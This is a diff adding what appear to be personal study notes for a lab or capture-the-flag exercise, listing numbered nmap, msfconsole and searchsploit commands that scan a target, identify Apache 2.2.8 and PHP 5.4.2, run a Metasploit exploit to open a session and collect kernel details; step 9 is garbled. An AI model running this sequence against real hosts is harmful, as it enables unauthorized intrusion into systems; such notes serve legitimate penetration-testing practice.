@@ -1,1 +1,39 @@
+1. run nmap <ip> -sV
+- check port 80 if it is open
+
+2. use msfconsole (metaploit console interface)
+
+3. search http_version
+
+4. use 0
+
+5. show option
+- check which field is not filled
+- usually RHOSTS
+
+6. set hosts <ip>
+
+7. exploit
+- look at the apache version
+
+8. searchsploit apache 2.2.8 | grep php
+- look at the php version
+
+9. grep gpi search php 5.4.2
+
+10. use 1
+
+11. show option
+
+12. set rhosts <ip>
+
+13. exploit
+
+14. sysinfo
+- obtain system info
+- look at linux kernel version
+
+
+
+
 
